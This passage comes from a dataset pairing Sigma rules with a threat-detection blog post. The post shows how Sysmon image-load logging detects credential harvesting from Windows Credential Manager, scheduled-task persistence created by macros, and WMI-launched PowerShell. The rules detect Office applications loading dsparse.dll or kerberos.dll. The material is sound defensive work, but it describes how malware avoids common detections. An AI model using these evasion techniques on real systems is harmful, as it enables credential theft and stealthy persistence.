functionality to enumerate or harvest saved credentials.\n\nThe screenshot below from Process Hacker shows that Fareit malware loaded the `vaultcli.dll` module.\n\n```image\nAlt: Credential Vault Client Library (vaultcli.dll) DLL loaded by Fareit malware\nDescription: The image displays the properties window of the process 'fareit.exe' (PID 4516) in Windows. The window includes details under various tabs such as General, Memory, Environment, and Modules. Notably, it shows the list of loaded modules, with 'vaultcli.dll' highlighted, indicating its base address, size, and description as 'Credential Vault Client Library'. This detail is relevant for analyzing the behavior of the 'fareit' malware in relation to credential harvesting.\nTranscription: |\n  fareit.exe (4516) Properties\n  ------------------------------------------------------------------------------\n  | Name            | Base address | Size    | Description                     |\n  | --------------- | ------------ | ------- | ------------------------------- |\n  | ws2_32.dll      | 0x76a60000   | 396 kB  | Windows Socket 2.0 32-Bit DLL   |\n  | wow64win.dll    | 0x6fe40000   | 476 kB  | Wow64 Console and Win32 ...     |\n  | wow64cpu.dll    | 0x6ff20000   | 40 kB   | AMD64 Wow64 CPU                 |\n  | wow64.dll       | 0x6fec0000   | 328 kB  | Win32 Emulation on NT64         |\n  | WinTypes.dll    | 0x70ab0000   | 828 kB  | Windows Base Types DLL          |\n  | windows.stor... | 0x74110000   | 5.43 MB | Microsoft WinRT Storage API     |\n  | win32u.dll      | 0x746d0000   |         | Win32                           |\n  | vaultcli.dll    | 0x70b80000   | 216 kB  | Credential Vault Client Library |\n  | userenv.dll     | 0x73a20000   |         | Userenv                         |\n  | user32.dll      | 0x7c340000   |         | Multi-User Windows USER A       |\n  ------------------------------------------------------------------------------\n```\n\nThe following `Image Loaded` event was captured by Sysmon and shows that `vaultcli.dll` was loaded by `fareit.exe`, not `vaultcmd.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 14:15:42.301\nProcessGuid: {0AD3E319-E88D-5D46-0000-001097C2A500}\nProcessId: 4516\nImage: C:\\Users\\Roxy\\Downloads\\fareit.exe\nImageLoaded: C:\\Windows\\SysWOW64\\vaultcli.dll\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\nDescription: Credential Vault Client Library\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=8395B530CAB0415DAFE8B01B2A7342866C6F45E1,MD5=33F761B3487238BEEEE5577C3E089CE7,SHA256=325E4DDAF3F45B4B540A98E05FB6A6F036A6955875F303D833E7A7644EB939DC,IMPHASH=8721D7F174531C1C4F8942462C87C899\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can write an Event Query Language (EQL) query to detect unexpected processes loading `vaultcli.dll` as follows. If you’re not familiar with EQL, you can find the getting started guide here.\n\n## Example 2: Stealthy Scheduled Task Creation via VBA Macro\n\nA Microsoft Office document can contain VBA code to create a scheduled task for persistence without using the native scheduled tasks (`schtasks.exe`) utility. A sample that exhibited this behavior was recently documented here.\n\nMany defenders have logging and alerting in place to detect suspicious usage of `schtasks.exe`. The following sample would bypass this detection, which is why I found it interesting.\n\nIf we open the malicious Excel document with Process Monitor running, we can see that `excel.exe` loads `taskschd.dll` (File Description: `Task Scheduler COM API`). Unless you have VBA macro-enabled Office documents in your environment that create or modify Windows scheduled tasks, this behavior should not occur often.\n\n```image\nAlt: Process Monitor output showing excel.exe loading taskschd.dll\nDescription: The image displays the output from Process Monitor capturing an event where `excel.exe` successfully loads the `taskschd.dll` file, which is part of the Task Scheduler COM API in Windows. The event details include the date and time of the operation (8/5/2019 at 7:25:43 PM), the thread number (2212), the operation type ('Load Image'), the result ('SUCCESS'), and the file path for the loaded image (`C:\\\\Windows\\System32\\taskschd.dll`). Additionally, it shows the image base and size, indicating that this is a technical log relevant to detecting suspicious behavior in Microsoft Office applications.\nTranscription: |\n  Event Properties\n  \n  Event:\n  Date: 8/5/2019 7:25:43.4163713 PM\n  Thread: 2212\n  Class: Process\n  Operation: Load Image\n  Result: SUCCESS\n  Path: C:\\Windows\\System32\\taskschd.dll\n  Duration: 0.0000000\n  Image Base: 0x7fefa2b0000\n  Image Size: 0x127000\n```\n\nThe following `Image Loaded` event was captured by Sysmon showing that `taskschd.dll` was loaded by `excel.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-05 19:39:51.293\nProcessGuid: {6F8FEDE1-85F8-5D48-0000-0010DADC5401}\nProcessId: 4832\nImage: C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE\nImageLoaded: C:\\Windows\\System32\\taskschd.dll\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Task Scheduler COM API\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: taskschd.dll\nHashes: SHA1=6F5A626EFF54C33FDC8C9E3D7EA44677CA0818DA,MD5=BAAFAF9CEAEC0B73C2A3550A01F6CECB,SHA256=018CB95A43CEA2063EA24691C71D51EF60D522C21502ABA8AD93876363D4B857,IMPHASH=21BCC6496DD1370029F85F9F7A29B9FB\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can detect the behavior of Microsoft Office applications loading `taskschd.dll` with the following EQL query.\n\n## Example 3: WMI Execution via VBA Macro\n\nAn adversary may include a malicious macro in a Microsoft Office document to execute commands via Windows Management Instrumentation (WMI). The motive behind this behavior is to evade detections that rely on process relationships.\n\nA common detection for security operations teams is to look for suspicious child processes of Microsoft Office applications, such as `cmd.exe` or `powershell.exe`. Below is an EQL query to detect this behavior. The list of process names is not exhaustive.\n\nBy invoking WMI to execute a malicious `powershell.exe` command, `powershell.exe` is spawned with the parent process `wmiprvse.exe`, not `winword.exe` or whatever application is used to execute the macro.\n\n```image\nAlt: Process Monitor output showing powershell.exe with the parent process wmiprvse.exe\nDescription: The image displays output from a Process Monitor tool, showing a list of running processes on a Windows system. It highlights the `powershell.exe` process, which is indicated as being spawned by `wmiprvse.exe`, a WMI Provider Host. This output is relevant to the context of detecting malicious activity involving Windows Management Instrumentation (WMI) through a VBA macro in Microsoft Office. The list includes other processes like `services.exe`, `svchost.exe`, and `Conhost.exe`, along with their respective descriptions and image paths, contributing to the analysis of process relationships used by adversaries.\nTranscription: |\n  Only show processes still running at end of current trace\n  Timelines cover displayed events only\n  \n  Process                          Image Path\n  services.exe (776)               C:\\WINDOWS\\system32\\services.exe\n  svchost.exe (964)                C:\\WINDOWS\\system32\\svchost.exe\n  DllHost.exe (6756)               C:\\WINDOWS\\system32\\DllHost.exe\n  RuntimeBroker.exe (6116)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7172)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7796)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  wmiprvse.exe (1608)              C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n      powershell.exe (8880)        C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Conhost.exe (7740)               C:\\WINDOWS\\system32\\conhost.exe\n  backgroundTaskHost.exe (4896)    C:\\WINDOWS\\system32\\backgroundTaskHost.exe\n```\n\nWe can detect this suspicious behavior with the following EQL query:\n\n---\n\nWe have covered what image load event logging is, how to enable it using Sysmon, and some practical examples of how it can be used to detect evasive attempts to steal credentials, establish persistence, or execute malicious code.\n\nWhat adversary tradecraft can you detect by leveraging image load event logging or by combining these events with other event types such as process, network, or file events? I’d be interested in hearing any feedback, experiences, or findings that you would like to share. For anyone who would like to share any analytics for detection, please see the EQL Analytics Library contribution guide.",
    "sigma_rule": {
      "title": "Active Directory Parsing DLL Loaded Via Office Application",
      "id": "a2a3b925-7bb0-433b-b508-db9003263cc4",
      "status": "test",
      "description": "Detects DSParse DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-03-28",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|contains": "\\dsparse.dll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_dsparse_dll_load.yml",
    "id": "17"
  },
  {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL\n\nWhile examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules.\n\nI don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts.\n\n## What is an Image Load Event?\n\nA Windows process can load a dynamic link library (DLL) in order to use one or more of the DLL’s functions to carry out certain actions. For example, `notepad.exe` loads the DLL, `kernel32.dll` before it can use the CreateFileW function or API call to create or open files. This is an image load event.\n\n```image\nAlt: The imports table of notepad.exe shows that it imports CreateFileW from kernel32.dll\nDescription: The image displays the imports table for the Windows application 'notepad.exe' using the Pestudio tool. It lists various functions that 'notepad.exe' imports from dynamic link libraries (DLLs), specifically highlighting the 'CreateFileW' function imported from 'kernel32.dll'. The table shows additional columns for symbols, blacklisted status, anonymity, anti-debugging status, and the libraries from which these functions are imported. This information is pertinent for analyzing the executables and understanding how adversaries might leverage DLL imports for malicious activities.\nTranscription: |\n  | symbol (274)        | blacklisted | anonymous | anti-debug | library (29)       |\n  | ------------------- | ----------- | --------- | ---------- | ------------------ |\n  | CreateFileMappingW  | -           | -         | -          | kernel32.dll       |\n  | CreateFileW         | -           | -         | -          | kernel32.dll       |\n  | CreateFontIndirectW | -           | -         | -          | gdi32.dll          |\n  | CreateMutexExW      | -           | -         | -          | api-ms-win-core... |\n  | CreateSemaphoreExW  | -           | -         | -          | api-ms-win-core... |\n  | CreateStatusWindowW | -           | -         | -          | comctl32.dll       |\n  | CreateWindowExW     | -           | -         | -          | user32.dll         |\n  | DefWindowProcW      | -           | -         | -          | user32.dll         |\n  | DeleteDC            | -           | -         | -          | gdi32.dll          |\n  | DeleteFileW         | -           | -         | -          | kernel32.dll       |\n```\n\nImporting functions from existing DLLs means that developers don’t have to write their own code to have their software perform tasks such as writing or deleting files, creating additional processes, or handling network connections. “The use of DLLs helps promote modularization of code, code reuse, efficient memory usage, and reduced disk space.”\n\nAs you’ll see in the following examples, an adversary may write their malicious code to import functions from Windows or 3rd party software DLLs in order to help them achieve their objectives such as stealing passwords from or establishing persistence on their victim’s endpoint.\n\n## Configuring Image Load Event Logging\n\nMicrosoft Sysmon can be configured to log `Image Loaded` events to provide visibility into what DLLs are loaded by running processes.\n\n```image\nAlt: Description of Sysmon Event ID 7\nDescription: The image illustrates Sysmon Event ID 7, which pertains to 'Image Loaded' events. It visually summarizes the critical details of an event where a process (in this case, notepad.exe) loads a DLL (kernel32.dll). The image includes a structured format showing UtcTime, ProcessId, Image path, Loaded Image path, file version, description, product name, company, hash values (SHA1, MD5, SHA256, IMPHASH), and signature information. This data is essential for monitoring and detecting suspicious module loading behavior in a system.\nTranscription: |\n  Event ID 7: Image loaded\n  The image loaded event logs when a module is loaded in a specific process. This event is disabled by default and needs to be configured with the –l option. It indicates the process in which the module is loaded, hashes and signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading. This event should be configured carefully, as monitoring all image load events will generate a large number of events.\n```\n\nRoberto Rodriguez’s (@Cyb3rWard0g) Sysmon configuration file will capture the above Event ID.\n\nExecute the following command to install Sysmon and apply a configuration file.\n\n```\nsysmon.exe -i -c .\\config_file.xml\n```\n\nYou can review Sysmon events in Event Viewer under `Microsoft-Windows-Sysmon/Operational`. Below is an example `Image Loaded` event. As you can see, the process `notepad.exe` loaded `kernel32.dll`. Sysmon collects other useful information such as the hashes and signer information for the image that was loaded.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 13:59:40.739\nProcessGuid: {0AD3E319-E4CC-5D46-0000-0010A1A06A00}\nProcessId: 4132\nImage: C:\\Windows\\System32\\notepad.exe\nImageLoaded: C:\\Windows\\System32\\kernel32.dll\nFileVersion: 10.0.14393.206 (rs1_release.160915-0644)\nDescription: Windows NT BASE API Client DLL\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=6EE3E2D33012161659609DADEA59A2164C5A5CEB,MD5=6955067712F2F4752CA12192B08EF860,SHA256=E02A3B57EA8B393408FF782866A1D342DD8C6B5F5925BA527981DBB21B6A4080,IMPHASH=3CE0779E0F4E275CD51A359A98CCC682\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nLet’s look at some examples of suspicious module loading behavior and how you can detect it.\n\n## Example 1: Malware Harvesting Credentials from Windows Credential Manager\n\nWindows Credential Manager allows you to create, view, or delete your saved credentials for signing in to websites, connected applications, and networks. An adversary may attempt to list or dump credentials stored in the Credential Manager.\n\nWhen the built-in `vaultcmd.exe` command line utility is used to list or manage stored credentials, this process loads the `vaultcli.dll` module. This is behavior is normal.\n\n```image\nAlt: Process Monitor output shows vaultcli.dll loaded by vaultcmd.exe\nDescription: The image displays a screenshot from Process Monitor, showing various entries related to the `vaultcli.dll` module. It includes timestamps, process names (e.g., `VaultCmd.exe`), process IDs, operations performed (like `CreateFile`), the path to the DLL, the result of each operation (all marked as 'SUCCESS'), and additional detail about the desired access (Read Attributes and Read Data/List). This output is relevant to detecting malicious activities involving credential management.\nTranscription: |\n  Time of Day          Process Name     PID   Operation     Path                                 Result   Detail\n  10:37:05.9901803 AM VaultCmd.exe      772   CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Attributes,\n  10:33:04.5633819 AM VaultCmd.exe      2056  CloseFile     C:\\Windows\\System32\\vaultcli.dll     SUCCESS \n  10:33:04.5634521 AM VaultCmd.exe      2056  CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Data/List\n```\n\nExamining the exports table of `vaultcli.dll` suggests that this DLL provides the functionality to enumerate or get information from the credential vault.\n\n```image\nAlt: Reviewing the exports table of vaultcli.dll\nDescription: The image shows a screenshot from Pestudio, a malware analysis tool, displaying information about the 'vaultcli.dll' file located in the Windows SysWOW64 directory. The interface lists various components of the DLL, including indicators, sections, libraries, imports, and exports. Specifically, it highlights the exports section, detailing function names related to the Credential Vault Client Library, including 'VaultRemoveItem', 'VaultOpenVault', and 'VaultEnumerateItems'. This information is relevant for understanding how the 'vaultcli.dll' can be manipulated by malware authors to harvest credentials.\nTranscription: |\n  pestudio 8.56 - Malware Initial Assessment - www.winitor.com\n  File: c:\\windows\\syswow64\\vaultcli.dll\n  \n  indicators (10)\n    virustotal (n/a)\n    dos-stub (184 bytes)\n    file-header (20 bytes)\n    optional-header (224 bytes)\n    directories (15)\n    sections (6)\n    libraries (34)\n    imports (195)\n    exports (anonymous)\n  \n  index    name (17)                  address\n  124      VaultRemoveItem            0x00000000\n  123      VaultOpenVault             0x00000000\n  122      VaultGetItemType           0x00000000\n  121      VaultGetItem               0x00000000\n  120      VaultGetInformation        0x00000000\n  119      VaultFree                  0x00000000\n  118      VaultFindItems             0x00000000\n  117      VaultEnumerateVaults       0x00000000\n  116      VaultEnumerateItems        0x00000000\n  115      VaultEnumerateItemTypes    0x00000000\n  114      VaultDeleteItemType        0x00000000\n```\n\nSome malware authors abuse the functions provided by the Credential Vault Client Library (`vaultcli.dll`) by importing its functionality to enumerate or harvest saved credentials.\n\nThe screenshot below from Process Hacker shows that Fareit malware loaded the `vaultcli.dll` module.\n\n```image\nAlt: Credential Vault Client Library (vaultcli.dll) DLL loaded by Fareit malware\nDescription: The image displays the properties window of the process 'fareit.exe' (PID 4516) in Windows. The window includes details under various tabs such as General, Memory, Environment, and Modules. Notably, it shows the list of loaded modules, with 'vaultcli.dll' highlighted, indicating its base address, size, and description as 'Credential Vault Client Library'. This detail is relevant for analyzing the behavior of the 'fareit' malware in relation to credential harvesting.\nTranscription: |\n  fareit.exe (4516) Properties\n  ------------------------------------------------------------------------------\n  | Name            | Base address | Size    | Description                     |\n  | --------------- | ------------ | ------- | ------------------------------- |\n  | ws2_32.dll      | 0x76a60000   | 396 kB  | Windows Socket 2.0 32-Bit DLL   |\n  | wow64win.dll    | 0x6fe40000   | 476 kB  | Wow64 Console and Win32 ...     |\n  | wow64cpu.dll    | 0x6ff20000   | 40 kB   | AMD64 Wow64 CPU                 |\n  | wow64.dll       | 0x6fec0000   | 328 kB  | Win32 Emulation on NT64         |\n  | WinTypes.dll    | 0x70ab0000   | 828 kB  | Windows Base Types DLL          |\n  | windows.stor... | 0x74110000   | 5.43 MB | Microsoft WinRT Storage API     |\n  | win32u.dll      | 0x746d0000   |         | Win32                           |\n  | vaultcli.dll    | 0x70b80000   | 216 kB  | Credential Vault Client Library |\n  | userenv.dll     | 0x73a20000   |         | Userenv                         |\n  | user32.dll      | 0x7c340000   |         | Multi-User Windows USER A       |\n  ------------------------------------------------------------------------------\n```\n\nThe following `Image Loaded` event was captured by Sysmon and shows that `vaultcli.dll` was loaded by `fareit.exe`, not `vaultcmd.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 14:15:42.301\nProcessGuid: {0AD3E319-E88D-5D46-0000-001097C2A500}\nProcessId: 4516\nImage: C:\\Users\\Roxy\\Downloads\\fareit.exe\nImageLoaded: C:\\Windows\\SysWOW64\\vaultcli.dll\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\nDescription: Credential Vault Client Library\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=8395B530CAB0415DAFE8B01B2A7342866C6F45E1,MD5=33F761B3487238BEEEE5577C3E089CE7,SHA256=325E4DDAF3F45B4B540A98E05FB6A6F036A6955875F303D833E7A7644EB939DC,IMPHASH=8721D7F174531C1C4F8942462C87C899\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can write an Event Query Language (EQL) query to detect unexpected processes loading `vaultcli.dll` as follows. If you’re not familiar with EQL, you can find the getting started guide here.\n\n## Example 2: Stealthy Scheduled Task Creation via VBA Macro\n\nA Microsoft Office document can contain VBA code to create a scheduled task for persistence without using the native scheduled tasks (`schtasks.exe`) utility. A sample that exhibited this behavior was recently documented here.\n\nMany defenders have logging and alerting in place to detect suspicious usage of `schtasks.exe`. The following sample would bypass this detection, which is why I found it interesting.\n\nIf we open the malicious Excel document with Process Monitor running, we can see that `excel.exe` loads `taskschd.dll` (File Description: `Task Scheduler COM API`). Unless you have VBA macro-enabled Office documents in your environment that create or modify Windows scheduled tasks, this behavior should not occur often.\n\n```image\nAlt: Process Monitor output showing excel.exe loading taskschd.dll\nDescription: The image displays the output from Process Monitor capturing an event where `excel.exe` successfully loads the `taskschd.dll` file, which is part of the Task Scheduler COM API in Windows. The event details include the date and time of the operation (8/5/2019 at 7:25:43 PM), the thread number (2212), the operation type ('Load Image'), the result ('SUCCESS'), and the file path for the loaded image (`C:\\\\Windows\\System32\\taskschd.dll`). Additionally, it shows the image base and size, indicating that this is a technical log relevant to detecting suspicious behavior in Microsoft Office applications.\nTranscription: |\n  Event Properties\n  \n  Event:\n  Date: 8/5/2019 7:25:43.4163713 PM\n  Thread: 2212\n  Class: Process\n  Operation: Load Image\n  Result: SUCCESS\n  Path: C:\\Windows\\System32\\taskschd.dll\n  Duration: 0.0000000\n  Image Base: 0x7fefa2b0000\n  Image Size: 0x127000\n```\n\nThe following `Image Loaded` event was captured by Sysmon showing that `taskschd.dll` was loaded by `excel.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-05 19:39:51.293\nProcessGuid: {6F8FEDE1-85F8-5D48-0000-0010DADC5401}\nProcessId: 4832\nImage: C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE\nImageLoaded: C:\\Windows\\System32\\taskschd.dll\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Task Scheduler COM API\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: taskschd.dll\nHashes: SHA1=6F5A626EFF54C33FDC8C9E3D7EA44677CA0818DA,MD5=BAAFAF9CEAEC0B73C2A3550A01F6CECB,SHA256=018CB95A43CEA2063EA24691C71D51EF60D522C21502ABA8AD93876363D4B857,IMPHASH=21BCC6496DD1370029F85F9F7A29B9FB\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can detect the behavior of Microsoft Office applications loading `taskschd.dll` with the following EQL query.\n\n## Example 3: WMI Execution via VBA Macro\n\nAn adversary may include a malicious macro in a Microsoft Office document to execute commands via Windows Management Instrumentation (WMI). The motive behind this behavior is to evade detections that rely on process relationships.\n\nA common detection for security operations teams is to look for suspicious child processes of Microsoft Office applications, such as `cmd.exe` or `powershell.exe`. Below is an EQL query to detect this behavior. The list of process names is not exhaustive.\n\nBy invoking WMI to execute a malicious `powershell.exe` command, `powershell.exe` is spawned with the parent process `wmiprvse.exe`, not `winword.exe` or whatever application is used to execute the macro.\n\n```image\nAlt: Process Monitor output showing powershell.exe with the parent process wmiprvse.exe\nDescription: The image displays output from a Process Monitor tool, showing a list of running processes on a Windows system. It highlights the `powershell.exe` process, which is indicated as being spawned by `wmiprvse.exe`, a WMI Provider Host. This output is relevant to the context of detecting malicious activity involving Windows Management Instrumentation (WMI) through a VBA macro in Microsoft Office. The list includes other processes like `services.exe`, `svchost.exe`, and `Conhost.exe`, along with their respective descriptions and image paths, contributing to the analysis of process relationships used by adversaries.\nTranscription: |\n  Only show processes still running at end of current trace\n  Timelines cover displayed events only\n  \n  Process                          Image Path\n  services.exe (776)               C:\\WINDOWS\\system32\\services.exe\n  svchost.exe (964)                C:\\WINDOWS\\system32\\svchost.exe\n  DllHost.exe (6756)               C:\\WINDOWS\\system32\\DllHost.exe\n  RuntimeBroker.exe (6116)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7172)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7796)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  wmiprvse.exe (1608)              C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n      powershell.exe (8880)        C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Conhost.exe (7740)               C:\\WINDOWS\\system32\\conhost.exe\n  backgroundTaskHost.exe (4896)    C:\\WINDOWS\\system32\\backgroundTaskHost.exe\n```\n\nWe can detect this suspicious behavior with the following EQL query:\n\n---\n\nWe have covered what image load event logging is, how to enable it using Sysmon, and some practical examples of how it can be used to detect evasive attempts to steal credentials, establish persistence, or execute malicious code.\n\nWhat adversary tradecraft can you detect by leveraging image load event logging or by combining these events with other event types such as process, network, or file events? I’d be interested in hearing any feedback, experiences, or findings that you would like to share. For anyone who would like to share any analytics for detection, please see the EQL Analytics Library contribution guide.",
    "sigma_rule": {
      "title": "Active Directory Kerberos DLL Loaded Via Office Application",
      "id": "7417e29e-c2e7-4cf6-a2e8-767228c64837",
      "status": "test",
      "description": "Detects Kerberos DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-03-28",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|endswith": "\\kerberos.dll"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_kerberos_dll_load.yml",
    "id": "20"
  },
  {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL\n\nWhile examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules.\n\nI don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts.\n\n## What is an Image Load Event?\n\nA Windows process can load a dynamic link library (DLL) in order to use one or more of the DLL’s functions to carry out certain actions. For example, `notepad.exe` loads the DLL, `kernel32.dll` before it can use the CreateFileW function or API call to create or open files. This is an image load event.\n\n```image\nAlt: The imports table of notepad.exe shows that it imports CreateFileW from kernel32.dll\nDescription: The image displays the imports table for the Windows application 'notepad.exe' using the Pestudio tool. It lists various functions that 'notepad.exe' imports from dynamic link libraries (DLLs), specifically highlighting the 'CreateFileW' function imported from 'kernel32.dll'. The table shows additional columns for symbols, blacklisted status, anonymity, anti-debugging status, and the libraries from which these functions are imported. This information is pertinent for analyzing the executables and understanding how adversaries might leverage DLL imports for malicious activities.\nTranscription: |\n  | symbol (274)        | blacklisted | anonymous | anti-debug | library (29)       |\n  | ------------------- | ----------- | --------- | ---------- | ------------------ |\n  | CreateFileMappingW  | -           | -         | -          | kernel32.dll       |\n  | CreateFileW         | -           | -         | -          | kernel32.dll       |\n  | CreateFontIndirectW | -           | -         | -          | gdi32.dll          |\n  | CreateMutexExW      | -           | -         | -          | api-ms-win-core... |\n  | CreateSemaphoreExW  | -           | -         | -          | api-ms-win-core... |\n  | CreateStatusWindowW | -           | -         | -          | comctl32.dll       |\n  | CreateWindowExW     | -           | -         | -          | user32.dll         |\n  | DefWindowProcW      | -           | -         | -          | user32.dll         |\n  | DeleteDC            | -           | -         | -          | gdi32.dll          |\n  | DeleteFileW         | -           | -         | -          | kernel32.dll       |\n```\n\nImporting functions from existing DLLs means that developers don’t have to write their own code to have their software perform tasks such as writing or deleting files, creating additional processes, or handling network connections. “The use of DLLs helps promote modularization of code, code reuse, efficient memory usage, and reduced disk space.”\n\nAs you’ll see in the following examples, an adversary may write their malicious code to import functions from Windows or 3rd party software DLLs in order to help them achieve their objectives such as stealing passwords from or establishing persistence on their victim’s endpoint.\n\n## Configuring Image Load Event Logging\n\nMicrosoft Sysmon can be configured to log `Image Loaded` events to provide visibility into what DLLs are loaded by running processes.\n\n```image\nAlt: Description of Sysmon Event ID 7\nDescription: The image illustrates Sysmon Event ID 7, which pertains to 'Image Loaded' events. It visually summarizes the critical details of an event where a process (in this case, notepad.exe) loads a DLL (kernel32.dll). The image includes a structured format showing UtcTime, ProcessId, Image path, Loaded Image path, file version, description, product name, company, hash values (SHA1, MD5, SHA256, IMPHASH), and signature information. This data is essential for monitoring and detecting suspicious module loading behavior in a system.\nTranscription: |\n  Event ID 7: Image loaded\n  The image loaded event logs when a module is loaded in a specific process. This event is disabled by default and needs to be configured with the –l option. It indicates the process in which the module is loaded, hashes and signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading. This event should be configured carefully, as monitoring all image load events will generate a large number of events.\n```\n\nRoberto Rodriguez’s (@Cyb3rWard0g) Sysmon configuration file will capture the above Event ID.\n\nExecute the following command to install Sysmon and apply a configuration file.\n\n```\nsysmon.exe -i -c .\\config_file.xml\n```\n\nYou can review Sysmon events in Event Viewer under `Microsoft-Windows-Sysmon/Operational`. Below is an example `Image Loaded` event. As you can see, the process `notepad.exe` loaded `kernel32.dll`. Sysmon collects other useful information such as the hashes and signer information for the image that was loaded.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 13:59:40.739\nProcessGuid: {0AD3E319-E4CC-5D46-0000-0010A1A06A00}\nProcessId: 4132\nImage: C:\\Windows\\System32\\notepad.exe\nImageLoaded: C:\\Windows\\System32\\kernel32.dll\nFileVersion: 10.0.14393.206 (rs1_release.160915-0644)\nDescription: Windows NT BASE API Client DLL\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=6EE3E2D33012161659609DADEA59A2164C5A5CEB,MD5=6955067712F2F4752CA12192B08EF860,SHA256=E02A3B57EA8B393408FF782866A1D342DD8C6B5F5925BA527981DBB21B6A4080,IMPHASH=3CE0779E0F4E275CD51A359A98CCC682\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nLet’s look at some examples of suspicious module loading behavior and how you can detect it.\n\n## Example 1: Malware Harvesting Credentials from Windows Credential Manager\n\nWindows Credential Manager allows you to create, view, or delete your saved credentials for signing in to websites, connected applications, and networks. An adversary may attempt to list or dump credentials stored in the Credential Manager.\n\nWhen the built-in `vaultcmd.exe` command line utility is used to list or manage stored credentials, this process loads the `vaultcli.dll` module. This is behavior is normal.\n\n```image\nAlt: Process Monitor output shows vaultcli.dll loaded by vaultcmd.exe\nDescription: The image displays a screenshot from Process Monitor, showing various entries related to the `vaultcli.dll` module. It includes timestamps, process names (e.g., `VaultCmd.exe`), process IDs, operations performed (like `CreateFile`), the path to the DLL, the result of each operation (all marked as 'SUCCESS'), and additional detail about the desired access (Read Attributes and Read Data/List). This output is relevant to detecting malicious activities involving credential management.\nTranscription: |\n  Time of Day          Process Name     PID   Operation     Path                                 Result   Detail\n  10:37:05.9901803 AM 